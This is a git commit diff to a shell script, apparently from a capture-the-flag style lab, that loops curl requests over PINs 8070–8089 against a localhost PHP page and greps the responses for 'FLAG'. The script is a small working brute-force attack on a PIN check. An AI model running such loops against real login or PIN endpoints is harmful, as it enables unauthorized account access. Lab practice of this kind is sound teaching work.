09c98a4ce9e58c3e4cb62a80cd302458bbf633df
Tohru Saitoh <tsaitoh.net@gmail.com>
2021-11-09 23:30:47 +0900

    2021/11/09-perrine

--- brute-force-pin4.sh
+++ brute-force-pin4.sh
@@ -3,5 +3,5 @@
 for PW in `seq 8070 8089`
 do
 	echo $PW
-	curl https://localhost/~ubuntu/recp/brute-force-pin4.php?PW=$PW
+	curl -s http://localhost/~ubuntu/recp/brute-force-pin4.php?PW=$PW | grep FLAG
 done
